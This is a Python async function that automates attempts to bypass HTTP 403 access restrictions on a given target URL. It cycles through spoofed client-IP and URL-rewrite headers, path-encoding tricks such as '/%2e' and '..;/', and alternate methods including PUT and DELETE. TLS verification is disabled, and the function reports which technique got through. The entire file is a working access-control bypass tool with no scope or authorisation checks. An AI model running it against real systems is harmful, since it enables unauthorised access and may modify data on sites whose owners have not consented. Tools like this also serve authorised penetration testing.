import httpx
from urllib.parse import urlparse


async def bypass_403(target: str) -> dict:
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    parsed = urlparse(target)
    path = parsed.path or "/"
    results = []

    header_tricks = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Original-URL": path, "X-Rewrite-URL": path},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"Client-IP": "127.0.0.1"},
    ]

    path_tricks = [
        f"/%2e{path}", f"/{path}/", f"/{path}..;/", f"/;/{path}",
        path.upper(), f"/./{path}", f"/*/{path}",
    ]

    async with httpx.AsyncClient(timeout=15.0, follow_redirects=False, verify=False) as client:
        try:
            resp = await client.get(target)
            baseline = resp.status_code
        except httpx.HTTPError:
            baseline = 403

        for headers in header_tricks:
            try:
                resp = await client.get(target, headers=headers)
                if resp.status_code != baseline and resp.status_code < 400:
                    results.append({"technique": f"Header: {list(headers.keys())[0]}", "status": resp.status_code, "success": True})
                    break
            except httpx.HTTPError:
                continue

        if not results:
            for trick in path_tricks:
                try:
                    resp = await client.get(f"{parsed.scheme}://{parsed.hostname}{trick}")
                    if resp.status_code != baseline and resp.status_code < 400:
                        results.append({"technique": f"Path: {trick}", "status": resp.status_code, "success": True})
                        break
                except httpx.HTTPError:
                    continue

        if not results:
            for method in ["POST", "PUT", "PATCH", "DELETE", "OPTIONS"]:
                try:
                    resp = await client.request(method, target)
                    if resp.status_code != baseline and resp.status_code < 400:
                        results.append({"technique": f"Method: {method}", "status": resp.status_code, "success": True})
                        break
                except httpx.HTTPError:
                    continue

    return {"target": target, "baseline_status": baseline, "bypasses": results, "bypass_found": len(results) > 0}
